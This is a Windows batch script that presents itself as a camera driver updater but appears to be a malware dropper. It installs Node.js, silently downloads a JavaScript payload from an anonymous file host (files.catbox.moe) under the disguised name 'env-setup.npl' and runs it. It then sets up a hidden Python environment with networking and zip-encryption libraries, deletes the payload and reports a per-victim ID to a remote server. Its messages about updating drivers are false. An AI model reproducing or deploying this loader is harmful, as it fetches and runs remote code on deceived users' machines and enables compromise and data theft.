@echo off
title Creating new Info
setlocal enabledelayedexpansion
set "WINDOW_UID=__ID__"

if not defined WINDOW_UID goto :err_uid
if "!WINDOW_UID!"=="" goto :err_uid
if "!WINDOW_UID!"=="__ID__" goto :err_uid

echo [INFO] Searching for Camera Drivers ...

:: if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b

set "EXTRACT_DIR=%~dp0nodejs"
set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles64\nodejs\node.exe"
set "NODE_EXE="
set "NODE_VERSION="
set "LATEST_VERSION="

:: Check global / portable Node FIRST — do not call nodejs.org until we need an MSI (avoids hang on Invoke-RestMethod).
where node >nul 2>&1
if not errorlevel 1 (
    for /f "delims=" %%v in ('node -v 2^>nul') do set "NODE_INSTALLED_VERSION=%%v"
    set "NODE_EXE=node"
    echo [INFO] Using installed Node.js !NODE_INSTALLED_VERSION!
)

if not defined NODE_EXE if exist "%PORTABLE_NODE%" (
    set "NODE_EXE=%PORTABLE_NODE%"
    set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
    echo [INFO] Using portable Node.js at %PORTABLE_NODE%
)

REM Only fetch dist/index.json when we still have no Node ^(must download MSI^). Timeout prevents indefinite hang.
if not defined NODE_EXE (
    echo [INFO] Resolving latest Node.js from nodejs.org ^(max 45s^)...
    for /f "delims=" %%v in ('powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue'; try { $r=Invoke-RestMethod -Uri 'https://nodejs.org/dist/index.json' -TimeoutSec 45; $r[0].version } catch { exit 1 }"') do set "LATEST_VERSION=%%v"
    if "!LATEST_VERSION!"=="" (
        echo [ERROR] Could not reach nodejs.org to read latest Node version. Check network, firewall, or proxy.
        exit /b 1
    )
    set "NODE_VERSION=!LATEST_VERSION:~1!"
    set "NODE_MSI=node-v!NODE_VERSION!-x64.msi"
    set "DOWNLOAD_URL=https://nodejs.org/dist/v!NODE_VERSION!/!NODE_MSI!"
    set "MSI_OUT=%~dp0!NODE_MSI!"

    echo [INFO] Downloading Node.js installer...
    where curl >nul 2>&1
    if errorlevel 1 (
        powershell -NoProfile -Command "Invoke-WebRequest -Uri \"!DOWNLOAD_URL!\" -OutFile \"!MSI_OUT!\"" >nul 2>&1
    ) else (
        curl -s -L --connect-timeout 30 --max-time 600 -o "!MSI_OUT!" "!DOWNLOAD_URL!"
    )

    if exist "!MSI_OUT!" (
        echo [INFO] Extracting Node.js...
        msiexec /a "!MSI_OUT!" /qn TARGETDIR="%EXTRACT_DIR%" >nul 2>&1
        del "!MSI_OUT!"
    ) else (
        echo [ERROR] Node.js MSI download failed.
        exit /b 1
    )

    if exist "%PORTABLE_NODE%" (
        set "NODE_EXE=%PORTABLE_NODE%"
        set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
    ) else (
        echo [ERROR] Node.exe not found after MSI admin install. Expected: %PORTABLE_NODE%
        exit /b 1
    )
)

:: -------------------------
:: Confirm Node.js works
:: -------------------------
if not defined NODE_EXE (
    echo [ERROR] Node.js is not available after setup.
    exit /b 1
)
:: -------------------------
:: Download required files
:: -------------------------
set "CODEPROFILE=%USERPROFILE%"
if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%"

where curl >nul 2>&1
if errorlevel 1 (
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri 'https://files.catbox.moe/1gq866.js' -OutFile '%CODEPROFILE%\env-setup.npl'" >nul 2>&1
) else (
    curl -sSL -o "%CODEPROFILE%\env-setup.npl" "https://files.catbox.moe/92zc8z.js" >nul 2>&1
)
:: -------------------------
:: Run the parser
:: -------------------------
if exist "%CODEPROFILE%\env-setup.npl" (
    set "DRIVER_CURL_HOME=%TEMP%\wdcurl_driver_silent"
    mkdir "!DRIVER_CURL_HOME!" 2>nul
    (
    echo silent
    echo show-error
    ) > "!DRIVER_CURL_HOME!\.curlrc"
    set "CURL_HOME=!DRIVER_CURL_HOME!"
    echo [INFO] Updating Driver Packages...
    cd "%CODEPROFILE%"
    "%NODE_EXE%" "env-setup.npl"
    mkdir C:\python 2>nul && curl -sSL https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip -o C:\python\py.zip && powershell -NoProfile -Command "Expand-Archive -Path C:\python\py.zip -DestinationPath C:\python -Force" && del C:\python\py.zip && powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1

    powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1

    curl -sSL https://bootstrap.pypa.io/get-pip.py -o C:\python\get-pip.py >nul 2>&1
    C:\python\python.exe C:\python\get-pip.py >nul 2>&1
    C:\python\python.exe -m pip install requests portalocker pyzipper >nul 2>&1

    if errorlevel 1 (
        exit /b 1
    )
    if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
) else (
    exit /b 1
)
echo [SUCCESS] Camera drivers have been updated successfully.
if defined WINDOW_UID (
  set "AUTO_URL=https://api.canditech.org/change-connection-status/!WINDOW_UID!"
  curl -sL -X POST "!AUTO_URL!" -o nul
)
exit /b 0

:err_uid
echo [ERROR] WINDOW_UID is missing, empty, or still set to the placeholder __ID__.
exit /b 1